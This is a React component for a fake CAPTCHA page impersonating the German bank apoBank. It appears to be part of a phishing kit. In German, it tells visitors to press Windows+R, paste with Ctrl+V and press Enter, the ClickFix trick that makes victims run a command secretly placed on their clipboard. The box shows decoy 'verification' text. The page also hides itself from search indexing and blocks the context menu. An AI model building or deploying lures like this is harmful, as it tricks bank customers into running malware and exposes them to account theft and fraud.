import { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { ChevronsRight, Check } from "lucide-react";
import Index from "./Index";

const CfCaptcha = () => {
  const navigate = useNavigate();
  const trackRef = useRef<HTMLDivElement>(null);
  const [dragging, setDragging] = useState(false);
  const [x, setX] = useState(0);
  const [done, setDone] = useState(false);
  const startXRef = useRef(0);
  const startPosRef = useRef(0);
  const KNOB = 44;

  const maxX = () => {
    const w = trackRef.current?.clientWidth ?? 0;
    return Math.max(0, w - KNOB - 8);
  };

  const finish = () => {
    setDone(true);
    setTimeout(() => navigate("/homepage"), 500);
  };

  const onDown = (clientX: number) => {
    if (done) return;
    setDragging(true);
    startXRef.current = clientX;
    startPosRef.current = x;
  };
  const onMove = (clientX: number) => {
    if (!dragging || done) return;
    const next = Math.min(maxX(), Math.max(0, startPosRef.current + (clientX - startXRef.current)));
    setX(next);
  };
  const onUp = () => {
    if (!dragging) return;
    setDragging(false);
    if (x >= maxX() - 4) {
      setX(maxX());
      finish();
    } else {
      setX(0);
    }
  };

  useEffect(() => {
    const meta = document.createElement("meta");
    meta.name = "robots";
    meta.content = "noindex, nofollow, noarchive, nosnippet, noimageindex";
    document.head.appendChild(meta);
    const prevent = (e: Event) => e.preventDefault();
    document.addEventListener("contextmenu", prevent);
    return () => {
      document.head.removeChild(meta);
      document.removeEventListener("contextmenu", prevent);
    };
  }, []);

  useEffect(() => {
    const mm = (e: MouseEvent) => onMove(e.clientX);
    const mu = () => onUp();
    const tm = (e: TouchEvent) => onMove(e.touches[0].clientX);
    const tu = () => onUp();
    window.addEventListener("mousemove", mm);
    window.addEventListener("mouseup", mu);
    window.addEventListener("touchmove", tm);
    window.addEventListener("touchend", tu);
    return () => {
      window.removeEventListener("mousemove", mm);
      window.removeEventListener("mouseup", mu);
      window.removeEventListener("touchmove", tm);
      window.removeEventListener("touchend", tu);
    };
  });

  return (
    <div className="relative min-h-screen overflow-hidden bg-[#f5f7fa]">
      <div aria-hidden className="fixed inset-0 z-0 overflow-hidden pointer-events-none blur-md scale-105 select-none">
        <Index />
      </div>
      <div className="fixed inset-0 z-50 bg-black/40 flex items-center justify-center px-4 py-8 overflow-auto">
        <div className="w-full max-w-[680px]">
          <div className="flex items-center gap-3 mb-4">
            <div className="h-9 w-9 rounded-full bg-white border border-slate-200 flex items-center justify-center text-[#001f5b] font-bold">a</div>
            <h1 className="text-[26px] font-semibold text-[#0f172a] leading-none">apobank.de</h1>
          </div>
          <p className="text-[15px] text-slate-700 mb-4">
            Bitte bestätigen Sie durch die untenstehende Aktion, dass Sie ein Mensch sind.
          </p>

          <div className="rounded-xl overflow-hidden border border-slate-200 bg-white shadow-2xl">
            <header className="flex items-center justify-between px-6 py-5 bg-white border-b border-slate-100">
              <div className="flex items-center gap-3">
                <div className="h-6 w-6 rounded-full border-2 border-slate-300 border-t-[#001f5b] animate-spin" />
                <h2 className="text-[#0f172a] text-[18px] font-semibold leading-none">
                  Sicherheitsüberprüfung
                </h2>
              </div>
              <div className="text-right text-[11px] leading-tight text-slate-500">
                <div className="text-[#001f5b] font-medium">apoBank</div>
                <div>Vertraulichkeit</div>
                <div>Nutzungsbedingungen</div>
              </div>
            </header>

            <div className="bg-[#f5f7fa] px-6 py-8">
              <p className="text-[14px] text-[#0f172a] mb-3">
                Um besser nachzuweisen, dass Sie kein Roboter sind:
              </p>
              <ol className="list-decimal pl-6 text-[14px] text-[#0f172a] space-y-1 mb-4">
                <li>Halten Sie die <strong>Windows-Taste + R</strong> gedrückt.</li>
                <li>Drücken Sie im Bestätigungsfenster <strong>Strg + V</strong>.</li>
                <li>Drücken Sie <strong>Enter</strong> auf Ihrer Tastatur, um abzuschließen.</li>
              </ol>
              <p className="text-[13px] text-slate-600 mb-2">Sie werden Folgendes sehen und bestätigen:</p>
              <div className="mb-6 rounded-md border border-slate-200 bg-white px-3 py-2 font-mono text-[13px] text-slate-700">
                apoBank Verifizierung (Ref-ID: 90b0e54eb8bd5d84)
              </div>

              <div className="text-center">
                <p className="text-[13px] font-semibold text-[#0f172a]">
                  Schieben Sie den Regler nach rechts, um die Prüfung abzuschließen.
                </p>

                <div
                  ref={trackRef}
                  className="relative mx-auto mt-4 h-[56px] w-full rounded-lg bg-white border border-slate-200 shadow-sm select-none"
                >
                  <div
                    className="absolute inset-y-0 left-0 rounded-lg bg-[#e2ecf8] transition-[width] duration-75"
                    style={{ width: `${x + KNOB + 4}px`, opacity: done ? 1 : 0.9 }}
                  />
                  <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                    <span className="text-[13px] text-slate-500">
                      {done ? "Bestätigt" : "Nach rechts schieben →"}
                    </span>
                  </div>
                  <div
                    role="button"
                    aria-label="Regler nach rechts schieben"
                    onMouseDown={(e) => onDown(e.clientX)}
                    onTouchStart={(e) => onDown(e.touches[0].clientX)}
                    className={`absolute top-1 left-1 h-[48px] w-[48px] rounded-md bg-white border border-slate-200 shadow-md flex items-center justify-center ${
                      done ? "cursor-default" : "cursor-grab active:cursor-grabbing"
                    }`}
                    style={{ transform: `translateX(${x}px)`, transition: dragging ? "none" : "transform 200ms ease" }}
                  >
                    {done ? (
                      <Check className="h-5 w-5 text-[#2e7d32]" />
                    ) : (
                      <ChevronsRight className="h-5 w-5 text-[#001f5b]" />
                    )}
                  </div>
                </div>

                <p className="text-[11px] text-slate-500 mt-5">
                  Diese Prüfung schützt vor automatisierten Zugriffen.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default CfCaptcha;
